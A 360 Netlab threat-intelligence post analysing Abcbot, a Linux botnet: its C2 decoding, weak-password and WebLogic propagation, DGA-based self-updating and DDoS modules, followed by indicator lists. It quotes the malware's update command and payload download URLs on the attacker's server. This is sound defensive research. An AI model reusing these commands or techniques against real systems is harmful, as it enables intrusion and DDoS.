<!DOCTYPE html>
<html lang="en">
<head>

    <title>Abcbot, an evolving botnet</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=42b57cac00" />

    <link rel="icon" href="https://blog.netlab.360.com/content/images/size/w256h256/2019/02/netlab_xs-2.png" type="image/png">
    <link rel="canonical" href="https://blog.netlab.360.com/abcbot_an_evolving_botnet_en/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="amphtml" href="https://blog.netlab.360.com/abcbot_an_evolving_botnet_en/amp/">
    
    <meta property="og:site_name" content="360 Netlab Blog - Network Security Research Lab at 360">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Abcbot, an evolving botnet">
    <meta property="og:description" content="Background


Business on the cloud and security on the cloud is one of the industry trends in recent years. 360Netlab is also continuing to focus on security incidents and trends on the cloud from its own expertise in the technology field. The following is a recent security incident we observed,">
    <meta property="og:url" content="https://blog.netlab.360.com/abcbot_an_evolving_botnet_en/">
    <meta property="og:image" content="https://blog.netlab.360.com/content/images/2019/02/astronomy-constellation-dark-998641-4.jpg">
    <meta property="article:published_time" content="2021-11-09T14:00:00.000Z">
    <meta property="article:modified_time" content="2021-11-09T13:59:59.000Z">
    <meta property="article:tag" content="DDoS">
    <meta property="article:tag" content="en">
    <meta property="article:tag" content="Botnet">
    <meta property="article:tag" content="DGA">
    <meta property="article:tag" content="Golang">
    <meta property="article:tag" content="Import 2022-11-30 11:16">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Abcbot, an evolving botnet">
    <meta name="twitter:description" content="Background


Business on the cloud and security on the cloud is one of the industry trends in recent years. 360Netlab is also continuing to focus on security incidents and trends on the cloud from its own expertise in the technology field. The following is a recent security incident we observed,">
    <meta name="twitter:url" content="https://blog.netlab.360.com/abcbot_an_evolving_botnet_en/">
    <meta name="twitter:image" content="https://blog.netlab.360.com/content/images/2019/02/astronomy-constellation-dark-998641-4.jpg">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="Alex.Turing">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="DDoS, en, Botnet, DGA, Golang, Import 2022-11-30 11:16">
    <meta name="twitter:site" content="@360Netlab">
    <meta name="twitter:creator" content="@TuringAlex">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="800">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "360 Netlab Blog - Network Security Research Lab at 360",
        "url": "https://blog.netlab.360.com/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://blog.netlab.360.com/content/images/2019/02/netlab-brand-5.png"
        }
    },
    "author": {
        "@type": "Person",
        "name": "Alex.Turing",
        "image": {
            "@type": "ImageObject",
            "url": "https://blog.netlab.360.com/content/images/2019/06/turing.PNG",
            "width": 1200,
            "height": 1200
        },
        "url": "https://blog.netlab.360.com/author/alex/",
        "sameAs": [
            "https://twitter.com/TuringAlex"
        ]
    },
    "headline": "Abcbot, an evolving botnet",
    "url": "https://blog.netlab.360.com/abcbot_an_evolving_botnet_en/",
    "datePublished": "2021-11-09T14:00:00.000Z",
    "dateModified": "2021-11-09T13:59:59.000Z",
    "keywords": "DDoS, en, Botnet, DGA, Golang, Import 2022-11-30 11:16",
    "description": "Background\n\n\nBusiness on the cloud and security on the cloud is one of the industry trends in recent years. 360Netlab is also continuing to focus on security incidents and trends on the cloud from its own expertise in the technology field. The following is a recent security incident we observed, where the infected device IP came from multiple cloud provider platforms.\n\n\nOn July 14, 2021, our BotMon system identified an unknown ELF file (a14d0188e2646d236173b230c59037c7) generating a lot of scann",
    "mainEntityOfPage": "https://blog.netlab.360.com/abcbot_an_evolving_botnet_en/"
}
    </script>

    <meta name="generator" content="Ghost 5.76">
    <link rel="alternate" type="application/rss+xml" title="360 Netlab Blog - Network Security Research Lab at 360" href="https://blog.netlab.360.com/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="db8c743e6bb1457403d255d83f" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://blog.netlab.360.com/" crossorigin="anonymous"></script>
    
    <link href="https://blog.netlab.360.com/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=42b57cac00"></script>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=42b57cac00">
    <style type='text/css'>
	#ghost-portal-root {
        display: none;
    }
</style><style>:root {--ghost-accent-color: #eca265;}</style>

</head>
<body class="post-template tag-ddos tag-en tag-botnet tag-dga tag-golang tag-import-2022-11-30-11-16 has-cover">
<div class="viewport">

    <header id="gh-head" class="gh-head outer">
        <nav class="gh-head-inner inner">

            <div class="gh-head-brand">
                <a class="gh-head-logo" href="https://blog.netlab.360.com">
                        <img src="https://blog.netlab.360.com/content/images/2019/02/netlab-brand-5.png" alt="360 Netlab Blog - Network Security Research Lab at 360" />
                </a>
                <div class="gh-head-brand-wrapper">
                    <button class="gh-search" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                    <a class="gh-burger" role="button">
                        <div class="gh-burger-box">
                            <div class="gh-burger-inner"></div>
                        </div>
                    </a>
                </div>
            </div>
            <div class="gh-head-menu">
                <ul class="nav">
    <li class="nav-botnet"><a href="https://blog.netlab.360.com/tag/botnet/">Botnet</a></li>
    <li class="nav-dnsmon"><a href="https://blog.netlab.360.com/tag/dnsmon/">DNSMon</a></li>
    <li class="nav-ddos"><a href="https://blog.netlab.360.com/tag/ddos/">DDoS</a></li>
    <li class="nav-passivedns"><a href="https://blog.netlab.360.com/tag/pdns/">PassiveDNS</a></li>
    <li class="nav-mirai"><a href="https://blog.netlab.360.com/tag/mirai/">Mirai</a></li>
    <li class="nav-dta"><a href="https://blog.netlab.360.com/tag/dta/">DTA</a></li>
</ul>

            </div>
            <div class="gh-head-actions">
                <div class="gh-social">
                        <a class="gh-social-link gh-social-twitter" href="https://twitter.com/360Netlab" title="Twitter" target="_blank" rel="me noopener"><svg class="icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg></a>
                        <a class="gh-social-link gh-social-feedly" href="https://feedly.com/i/subscription/feed/https://blog.netlab.360.com/rss/" title="RSS" target="_blank" rel="me noopener"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><circle cx="6.18" cy="17.82" r="2.18"/><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/></svg>
</a>
                </div>
            </div>
        </nav>
    </header>

    <div class="site-content">
             <div class="floating-header">
    <div class="floating-header-logo">
        <a href="https://blog.netlab.360.com">
                <img src="/content/images/size/w30/2019/02/netlab_xs-2.png" alt="360 Netlab Blog - Network Security Research Lab at 360 icon" />
            <span>360 Netlab Blog - Network Security Research Lab at 360</span>
        </a>
    </div>
    <span class="floating-header-divider">&mdash;</span>
    <div class="floating-header-title">Abcbot, an evolving botnet</div>
    <div class="floating-header-share">
        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
</svg>
</div>
        <a class="floating-header-share-tw" href="https://twitter.com/share?text=Abcbot%2C%20an%20evolving%20botnet&amp;url=https://blog.netlab.360.com/abcbot_an_evolving_botnet_en/"
            onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
            <svg class="icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg>        </a>
        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.netlab.360.com/abcbot_an_evolving_botnet_en/"
            onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
            <svg class="icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path d="M23.9981 11.9991C23.9981 5.37216 18.626 0 11.9991 0C5.37216 0 0 5.37216 0 11.9991C0 17.9882 4.38789 22.9522 10.1242 23.8524V15.4676H7.07758V11.9991H10.1242V9.35553C10.1242 6.34826 11.9156 4.68714 14.6564 4.68714C15.9692 4.68714 17.3424 4.92149 17.3424 4.92149V7.87439H15.8294C14.3388 7.87439 13.8739 8.79933 13.8739 9.74824V11.9991H17.2018L16.6698 15.4676H13.8739V23.8524C19.6103 22.9522 23.9981 17.9882 23.9981 11.9991Z"/></svg>        </a>
    </div>
    <progress id="reading-progress" class="progress" value="0">
        <div class="progress-container">
            <span class="progress-bar"></span>
        </div>
    </progress>
</div>


  <main id="site-main" class="site-main">
    <article class="article post tag-ddos tag-en tag-botnet tag-dga tag-golang tag-import-2022-11-30-11-16 no-image ">

      <header class="article-header gh-canvas">

        <div class="article-tag post-card-tags">
          <span class="post-card-primary-tag">
            <a href="/tag/ddos/">DDoS</a>
          </span>
        </div>

        <h1 class="article-title">Abcbot, an evolving botnet</h1>


        <div class="article-byline">
          <section class="article-byline-content">

            <ul class="author-list">
              <li class="author-list-item">
                <a href="/author/alex/" class="author-avatar">
                  <img class="author-profile-image" src="/content/images/2019/06/turing.PNG" alt="Alex.Turing" />
                </a>
              </li>
              <li class="author-list-item">
                <a href="/author/huiwang/" class="author-avatar">
                  <img class="author-profile-image" src="/content/images/2017/05/WechatIMG1.jpeg" alt="Hui Wang" />
                </a>
              </li>
            </ul>

            <div class="article-byline-meta">
              <h4 class="author-name"><a href="/author/alex/">Alex.Turing</a>, <a href="/author/huiwang/">Hui Wang</a></h4>
              <div class="byline-meta-content">
                <time class="byline-meta-date" datetime=" 2021-11-09">Nov 9, 2021</time>
                <span class="byline-reading-time"><span class="bull">&bull;</span> 10 min read</span>
              </div>
            </div>

          </section>
        </div>


      </header>

      <section class="gh-content gh-canvas">
        <!--kg-card-begin: markdown--><h1 id="background">Background</h1>
<p>Business on the cloud and security on the cloud is one of the industry trends in recent years. 360Netlab is also continuing to focus on security incidents and trends on the cloud from its own expertise in the technology field. The following is a recent security incident we observed, where the infected device IP came from multiple cloud provider platforms.</p>
<p>On July 14, 2021, our BotMon system identified an unknown ELF file (a14d0188e2646d236173b230c59037c7) generating a lot of scanning traffic, after analysis, we determined that this is a Go language implementation of Scanner, based on its source path &quot;abc-hello&quot; string, we named it <code>Abcbot</code> internally.</p>
<p>At the beginning, Abcbot was relatively simple, and could be seen as a scanner for attacking Linux systems, with a weak password &amp; Nday vulnerability for worm-like propagation. One interesting thing is that Abcbot's source path has the &quot;dga.go&quot; string, but <code>no related DGA implementation was found</code>. We assumed that its authors would add this feature in subsequent versions, other than that, we did not paid too much attention to it.</p>
<p>As time passed, Abcbot has continued to evolve, and <code>as we expected, it added the DGA feature in subsequent samples</code>. Today Abcbot has the ability to <strong>self-updating, setting up Webserver, laughing DDoS, as well as worm like propagation</strong>.</p>
<p>On October 8, 2021, Trend Micro released <a href="https://www.trendmicro.com/en_us/research/21/j/actors-target-huawei-cloud-using-upgraded-linux-malware-.html?ref=blog.netlab.360.com"><strong>an analysis of this family</strong></a>, which focused on the pre-SHELL scripts that spread Abcbot, but skimmed over the features of Abcbot itself.</p>
<p>Given that Abcbot is under continuous development, its features are constantly being updated, we decided to write this article to share our findings with the community.</p>
<h1 id="timeline">Timeline</h1>
<ul>
<li>
<p>On July 14, 2021, abcbot was first captured with the main functionality of Scanner,WebServer.</p>
</li>
<li>
<p>July 22, 2021, abcbot updated to include dga-related code in the self-updating function.</p>
</li>
<li>
<p>October 10, 2021, abcbot performed minor update.</p>
</li>
<li>
<p>October 12, 2021, another update, with some major code structure changes.</p>
</li>
<li>
<p>October 21, 2021, another update, adding the open source ATK rootkit to support DDoS functionality.</p>
</li>
<li>
<p>October 30, 2021, another update, abandoned ATK rootkit, to their own implementation of DDoS functionality.</p>
</li>
</ul>
<h1 id="abcbotoverview">Abcbot Overview</h1>
<p>We use the latest October 30, 2021 sample as a blueprint, this version targets mainly on common databases and WEB servers, it uses weak password &amp; Nday vulnerability to achieve worm-like propagation, the main focus is for DDoS.</p>
<p>It currently supports the following nine attack methods.</p>
<ul>
<li>tls Attack</li>
<li>tcp Attack</li>
<li>udp Attack</li>
<li>ace Attack</li>
<li>hulk Attack</li>
<li>httpGet Attack</li>
<li>goldenEye Attack</li>
<li>slowloris Attack</li>
<li>bandwidthDrain Attack</li>
</ul>
<p>Its basic flow chart is shown below.</p>
<img src="https://blog.netlab.360.com/content/images/2021/11/abcbot_brief.png" width="860px">
<h1 id="sampleanalysis">Sample Analysis</h1>
<p>We captured a total of 6 different versions of abcbot samples, and the sample of October 30 was selected as the main object of analysis in this paper, and its basic information is shown as follows.</p>
<pre><code>MD5:ae8f8cf967ca15a7689f2d1f79fbc5dc
ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
Packer:upx
Date:2021-10-30
</code></pre>
<p>Abcbot uses a standard UPX shell. When it runs in the compromised device, Abcbot confuses the user by copying itself into the following files, then starting the dockerlogger, iptablesupdate processes.</p>
<pre><code>/bin/dockerlogger
/usr/bin/dockerlogger
/etc/iptablesupdate
</code></pre>
<p>The <code>iptablesupdate</code> process is responsible for scanning for new infected devices, reporting the device information to C2, and waiting for the execution of DDoS commands issued by C2.</p>
<p>The <code>dockerlogger</code> process is responsible for turning the infected device into a webserver, reporting the device information to C2, and waiting for the execution of the Updata command issued by the update server, let’s take a closer look.</p>
<h2 id="0x01uploadingdeviceinformationtoc2">0x01: Uploading device information to C2</h2>
<p>The current Abcbot samples are hard-coded with a encrypted C2 string (&quot;GEVQYYdjQdquLemMLYlkLLXLQmq7NmL7NYXu&quot;), which is encoded using Base64 &amp; XOR encryption.</p>
<p>The Base64 decoding operation is shown below, and it can be seen that Abcbot changes the Alphabet value, which it uses as <code>LMNu67PQX21pqrR3YZaDEFGbcVIJjkKWdefstghiBACHlSTUmO5noxyz04vw89+/</code></p>
<img src="https://blog.netlab.360.com/content/images/2021/11/abcbot_base.png" width="860px">
<p>By dissociating the Base64 decoded result with <code>0x31 0x32 0x33</code>, the following final result can be obtained</p>
<pre><code>http://103.209.103.16:26800
</code></pre>
<p>After decrypting C2, both <code>iptablesupdate</code> and <code>dockerlogger</code> processes report device information to C2 via the path &quot;/api/postip&quot;, and the format of the device information is <code>OS:%v\x09CPU:%v\x09HX:%vh\x09os-name:%v\x09lanip:%v</code>.</p>
<p>Note both processes collect the same device information and call the abc_hello_util_Os_pz function. The only difference is shown in the figure below, which shows that the dockerlogger process appends &quot;\td0.02&quot; to the reported information, while iptablesupdate appends &quot;\ ti0.02&quot;, where the &quot;d&quot; and &quot;i&quot; characters imply the process reporting the traffic, and &quot;0.02&quot; is similar to the version (in the October 21 sample, the version is &quot;0.01&quot;).</p>
<img src="https://blog.netlab.360.com/content/images/2021/11/abcbot_twodiff.png" width="860px">
<p>The actual traffic generated is shown below.</p>
<img src="https://blog.netlab.360.com/content/images/2021/11/abcbot_reg.png" width="860px">
<h2 id="0x02scanandpropagation">0x02: Scan and propagation</h2>
<p>The &quot;abc_hello_plugin_StartScan&quot; function is responsible for infecting new devices. Its logic is to generate random IPs, detect whether the ports on the IPs that can be attacked are open, and then attack the services by either going through the corresponding weak password list or using the Nday vulnerabilities.</p>
<p>The following code snippet shows that Abcbot tries to attack Weblogic.</p>
<img src="https://blog.netlab.360.com/content/images/2021/11/abcbot_logic.png" width="860px">
<p>In the Abcbot sample, you can clearly see the functions used in the attack on the relevant network services.</p>
<img src="https://blog.netlab.360.com/content/images/2021/11/abcbot_serv.png" width="860px">
<p>The weak passwords and vulnerabilities used by Abcbot are the following</p>
<ul>
<li>SSH weak password</li>
<li>FTP weak password</li>
<li>PostgreSQL weak password</li>
<li>Redis weak password</li>
<li>Mssql weak password</li>
<li>Mongo weak password</li>
<li>WebLogic Vulnerability (CVE-2020-14882)</li>
</ul>
<h2 id="0x03webserver">0x03: WebServer</h2>
<p>Abcbot uses the &quot;abc_hello_web_StartServer&quot; function to start a WebServer on the infected device, listening on port 26800, and the supported methods and paths are shown in the following table.</p>
<table>
<thead>
<tr>
<th>Method</th>
<th>Path</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>/api/postip</td>
</tr>
<tr>
<td>POST</td>
<td>/api/configlist</td>
</tr>
<tr>
<td>POST</td>
<td>/api/getlist</td>
</tr>
<tr>
<td>POST</td>
<td>/api/check</td>
</tr>
</tbody>
</table>
<p>The actual effect is shown in the following figure.</p>
<img src="https://blog.netlab.360.com/content/images/2021/11/abcbot_web.png" width="860px">
<p>At present, the path that really being called is &quot;/api/check&quot;, which is used to determine whether the device has already been infected by requesting the target ip:26800/api/check during the scanning and propagation process.</p>
<img src="https://blog.netlab.360.com/content/images/2021/11/abcbot_check.png" width="860px">
<p>The other paths are only used to maintain connectivity and have no real use.When they are accessed, some logs files will be generated in the path &quot;/tmp.abchello&quot;.</p>
<p>In fact, using &quot;curl-X POST&quot; cmd to test C2, you can find that the above 4 paths also exist on C2. The author of Abcbot seems to want to break the current C/S network model and bring the role of Bot in the network closer to Server. Therefore, we speculate that the network structure of Acbbot may shift to P2P.</p>
<h2 id="0x04selfupdating">0x04: Self-updating</h2>
<p>On July 22, Abcbot introduced the &quot;abc_hello_util_Updata&quot; function to handle self-updates. Its logic is to request the &quot;2.txt&quot; resource from the remote server. The &quot;2.txt&quot; consists of two parts, which are in the format of <code>&quot;Resource(hex format)|digital signature(hex format)&quot;</code>. When Bot successfully pulls the 2.txt, it will verify the digital signature by the following code snippet.</p>
<img src="https://blog.netlab.360.com/content/images/2021/11/abcbot_verify.png" width="860px">
<p>The hard-coded public key in the sample is</p>
<pre><code>-----BEGIN RSA PUBLIC KEY-----

MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAL3zj6XQt7gYe+L6oI/IUvlJNZVsg/JX\x0AC7TCnl9p1JfBJFdx+W9FTFnO2Fr8/hAUtf1NpP/WG2fgeG4Nvdcuyq0CAwEAAQ==

-----END RSA PUBLIC KEY-----
</code></pre>
<p>After the verification is successful, the Resource is further decomposed, and the format of the Resource is <code>&quot;cmd|downloader url| crc32|cmd2&quot;</code>.</p>
<p>When the cmd is &quot;alldown2&quot;, the downloader url is requested and the crc32 hash value of the file is verified. The downloaded file completes the process of self-updating.</p>
<p>The actual 2.txt obtained is shown below.</p>
<img src="https://blog.netlab.360.com/content/images/2021/11/abcbot_updata.png" width="860px">
<p>The Resource part is decoded in HEX format which represents update command.</p>
<pre><code>alldown2|http://103.209.103.16:26800/ff.sh|611043B5|posterrorurl
</code></pre>
<p>There are 3 sources for the remote server domain name in this process as follows.</p>
<ol>
<li>
<p>Hard-coded TOR domain name (decryption method is the same as C2)</p>
</li>
<li>
<p>DGA algorithm generates prefix strings, which are spliced with 3 suffixes (.com, .tk, .pages.dev) to form the domain name</p>
</li>
<li>
<p>DGA algorithm generates the string as a github account, and then gets the upgrade resources from this github account</p>
</li>
</ol>
<p>The code snippet below is the process of Abcbot requesting 2.txt resources from DGA generated domain name and GITHUB repository.</p>
<img src="https://blog.netlab.360.com/content/images/2021/11/abcbot_dga.png" width="860px">
<p>The domain names used for the samples at each time point are shown below.</p>
<table>
<thead>
<tr>
<th>Date</th>
<th>MD5</th>
<th>Res Tor Domain</th>
<th>DGA Domain</th>
<th>DGA Github</th>
</tr>
</thead>
<tbody>
<tr>
<td>07-14</td>
<td>a14d0188e2646d236173b230c59037c7</td>
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>07-22</td>
<td>e535215fad2ef0885e03ba111bd36e24</td>
<td>1</td>
<td>3/month</td>
<td>1/month</td>
</tr>
<tr>
<td>10-10</td>
<td>6e66456ffb457c52950cf05a6aaabe4a</td>
<td>1</td>
<td>3/month</td>
<td>0</td>
</tr>
<tr>
<td>10-12</td>
<td>39d373434c947742168e07cc9010c992</td>
<td>1</td>
<td>3/month</td>
<td>0</td>
</tr>
<tr>
<td>10-21</td>
<td>e95c9bae6e2b44c6f9b98e2dfd769675</td>
<td>0</td>
<td>27/month</td>
<td>0</td>
</tr>
<tr>
<td>10-30</td>
<td>ae8f8cf967ca15a7689f2d1f79fbc5dc</td>
<td>0</td>
<td>27/month</td>
<td>0</td>
</tr>
</tbody>
</table>
<p>Part of DGA-generated domain names for Abcbot in October are shown below.</p>
<pre><code>dgixyyfug.tk
dgixyyfug.com
dgixyyfug.pages.dev
guyfixdyg.tk
guyfixdyg.com
guyfixdyg.pages.dev

</code></pre>
<p>When Abcbot started to use DGA to generate domain names for updating servers, we grabbed some of them at the first opportunity, which allowed us to measure its size. From the current statistics Abcbot is not very large, with a total of 261 IPs.</p>
<img src="https://blog.netlab.360.com/content/images/2021/11/abcbot_scale.png" width="860px">
<p>The current distribution of infected hosts by service providers is shown below.</p>
<img src="https://blog.netlab.360.com/content/images/2021/11/abcbot_static.png" width="860px">
<h2 id="0x05ddos">0x05: DDoS</h2>
<p>On October 21, Abcbot introduced the &quot;main_TimeDDos&quot; function to support DDoS attacks, its logic is to request DDoS instructions from C2 via the path &quot;/api/getlist&quot;, the instructions consist of 2 parts, <code>&quot;DDoS instruction (hex format) | instruction digital signature (hex format)&quot;</code>. When Bot receives the instruction, it reuses the digital signature in the self-renewal subsection above for verification, and can only execute it after the verification is successful.</p>
<p>The actual traffic generated is shown below, the &quot;73746f70&quot; string before the &quot;|&quot; character is the &quot;stop&quot; instruction.</p>
<img src="https://blog.netlab.360.com/content/images/2021/11/abcbot_ddos.png" width="860px">
<p>Interesting thing is that the sample on October 21 (md5:e95c9bae6e2b44c6f9b98e2dfd769675) uses the open source <a href="https://github.com/millken/kdev/tree/master/4atk%201.05new?ref=blog.netlab.360.com">ATK Rootkit</a> to implement the DDoS function.</p>
<img src="https://blog.netlab.360.com/content/images/2021/11/abcbot_rootkit-1.png" width="860px">
<p>Abcbot modified the main function in the ATK source code file <code>share_atk_svr.c</code>, and implemented a UDP server by monitoring SERV_PORT on 127.0.0.1 through the following code. SERV_PORT has 4, respectively 88,89,90,91.</p>
<pre><code>sockfd = socket(AF_INET, SOCK_DGRAM, 0);
bzero(&amp;servaddr, sizeof(servaddr));
servaddr.sin_family = AF_INET;
// servaddr.sin_addr.s_addr = htonl(INADDR_ANY); // 0.0.0.0 
servaddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);
servaddr.sin_port = htons(SERV_PORT);
</code></pre>
<p>When Abcbot receives the command sent by C2, it forwards the command to the UDP server, and the ATK rootkit performs the DDoS attack. The code snippet shown below is exactly the DDoS command&quot;BigUdp&quot; forwarded to the rootkit.</p>
<p>The supported commands are shown below.</p>
<ul>
<li>stop</li>
<li>syn</li>
<li>dns</li>
<li>bigudp</li>
</ul>
<p><strong>We do not consider this approach to DDoS attacks a good one</strong>, as ATK rootkit is stored in the form of source code on a remote server,</p>
<pre><code>xl_x64scan1=&quot;http://103.209.103.16:26800/atk.tar.gz&quot;
xl_x64scan2=&quot;http://103.209.103.16:26800/atk.tar.gz&quot;
</code></pre>
<p>thus requires Abcbot to download the source code, compile, and load the rootkit module before performing DDoS attack, this process requires too many steps, and any step that is faulty will result in the failure of the DDoS function.</p>
<p>Apparently the author had same thoughts, and in the October 30 sample (md5:ae8f8cf967ca15a7689f2d1f79fbc5dc) an update abandoned the ATK rootkit and implemented its own attack module, with nine attack methods being supported.</p>
<img src="https://blog.netlab.360.com/content/images/2021/11/abcbot_attack.png" width="860px">
<h1 id="summary">Summary</h1>
<p>In the process of reverse analysis, we found many oddities in Abcbot, such as &quot;repeatedly reporting local device information, not registering DGA domain names, unreasonable exclusion of TOR &amp; Github resource servers, and webserver functionality not really enabled&quot;, which gives us a feeling that Abcbot authors are testing various technologies. The update process in these six months is not so much a continuous upgrade of features as a trade-off between different technologies. Abcbot is slowly moving from infancy to maturity. We do not consider this stage to be the final form, there are obviously many areas of improvement or features to be developed at this stage. Let's wait and see what happens.</p>
<h1 id="contactus">Contact us</h1>
<p>Readers are always welcomed to reach us on <a href="https://twitter.com/360Netlab?ref=blog.netlab.360.com">Twitter</a> or email us to netlab at 360 dot cn.</p>
<h1 id="ioc">IOC</h1>
<h2 id="c2resourceserver">C2 &amp; Resource Server</h2>
<h3 id="dgadomainoctober">DGA Domain(October)</h3>
<pre><code>
dgixyyfug.tk
dgixyyfug.com
dgixyyfug.pages.dev
guyfixdyg.tk
guyfixdyg.com
guyfixdyg.pages.dev
gfgiudyyx.tk
gfgiudyyx.com
gfgiudyyx.pages.dev
xgudyfyig.tk
xgudyfyig.com
xgudyfyig.pages.dev
yugxdigfy.tk
yugxdigfy.com
yugxdigfy.pages.dev
gdgiyyfxu.tk
gdgiyyfxu.com
gdgiyyfxu.pages.dev
gdiuyyfgx.tk
gdiuyyfgx.com
gdiuyyfgx.pages.dev
fgiudxyyg.tk
fgiudxyyg.com
fgiudxyyg.pages.dev
ygfydgxui.tk
ygfydgxui.com
ygfydgxui.pages.dev
</code></pre>
<h3 id="dgadomainnovember">DGA Domain(November)</h3>
<pre><code>enjuyzkpr.tk
enjuyzkpr.com
enjuyzkpr.pages.dev
rpzkjueyn.tk
rpzkjueyn.com
rpzkjueyn.pages.dev
nkrjpezyu.tk
nkrjpezyu.com
nkrjpezyu.pages.dev
unpeykzjr.tk
unpeykzjr.com
unpeykzjr.pages.dev
ypnuejrkz.tk
ypnuejrkz.com
ypnuejrkz.pages.dev
nerjyzkup.tk
nerjyzkup.com
nerjyzkup.pages.dev
nejpzykru.tk
nejpzykru.com
nejpzykru.pages.dev
knjpeuzyr.tk
knjpeuzyr.com
knjpeuzyr.pages.dev
zrkyenupj.tk
zrkyenupj.com
zrkyenupj.pages.dev
</code></pre>
<h3 id="ip">IP</h3>
<pre><code>103.209.103.16	China|Hong_Kong|Unknown	AS63916|IPTELECOM_Global
</code></pre>
<h3 id="tor">Tor</h3>
<pre><code>http://vgnaovx6prvmvoeabk5bxfummn3ltdur3h4ilnklvaox4lge2rp4nzqd.onion
</code></pre>
<h2 id="samplemd5">Sample MD5</h2>
<pre><code>0786c80bfcedb7da9c2d5edbe9ff662f
0f2619811ceaf85baa72f9c8f876a59a
1177c135f15951418219a97b3caad4e1
1a720cc74ecf330b8f13412de4d5646b
39d373434c947742168e07cc9010c992
3f277c7b4c427f9ef02cf8df4dd7be44
5d37a61451e5cfdeca272369ac032076
6e66456ffb457c52950cf05a6aaabe4a
6e66456ffb457c52950cf05a6aaabe4a
89ffd4f612ce604457446ee2a218de67
8f3558b29d594d33e69cea130f054717
a14d0188e2646d236173b230c59037c7
a17ea52318baa4e50e4b6d3a79fbd935
a4c7917787dc28429839c7d588956202
ae8f8cf967ca15a7689f2d1f79fbc5dc
baeb11c659b8e38ea3f01ad075e9df9a
c27d1c81a3c45776e31cfb384787c674
c64fbc7d3586d42583aa3a0dc3ea529f
e535215fad2ef0885e03ba111bd36e24
e95c9bae6e2b44c6f9b98e2dfd769675
</code></pre>
<h2 id="downloader">Downloader</h2>
<pre><code>http://103[.209.103.16:26800/atk.tar.gz
http://103[.209.103.16:26800/dd.sh
http://103[.209.103.16:26800/ff.sh
http://103[.209.103.16:26800/linux64-shell
